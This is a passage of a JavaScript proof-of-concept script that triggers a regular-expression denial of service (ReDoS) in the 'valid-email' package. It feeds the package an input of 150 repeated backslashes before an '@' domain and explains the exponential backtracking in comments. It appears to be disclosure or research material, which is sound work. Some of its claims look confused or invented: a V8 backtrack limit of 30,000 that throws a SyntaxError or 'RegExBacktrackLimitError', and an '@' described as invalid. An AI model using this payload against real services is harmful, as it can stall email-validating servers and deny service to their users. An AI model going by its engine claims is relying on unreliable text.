  // while the character class also implicitly allows dot-matching behaviors. This creates 
  // ambiguous partitioning states where multiple regex paths can parse the same substring in different ways.
  // 
  // When the engine fails to match the full string (due to the invalid '@' delimiter), it must 
  // backtrack and re-evaluate every possible combination of how to group '\' using '\\.' vs '[...]'.
  // The branching factor is exponential O(2^n). Repeating '\\' 150 times reliably pushes the 
  // internal backtrack counter well past the 30,000 threshold in modern V8 engines.

  const maliciousPayload = "\\".repeat(150);
  const emailToTest = `${maliciousPayload}@research.example.com`;

  console.log('Triggering ReDoS in valid-email...');
  console.log(`Payload length: ${emailToTest.length} characters`);

  // No try/catch block. If the backtrack limit is exceeded, V8 throws a 
  // SyntaxError (or internal RegExBacktrackLimitError), which we intentionally allow to propagate.
  const result = valid(emailToTest);

  console.log('Unexpectedly completed:', result);
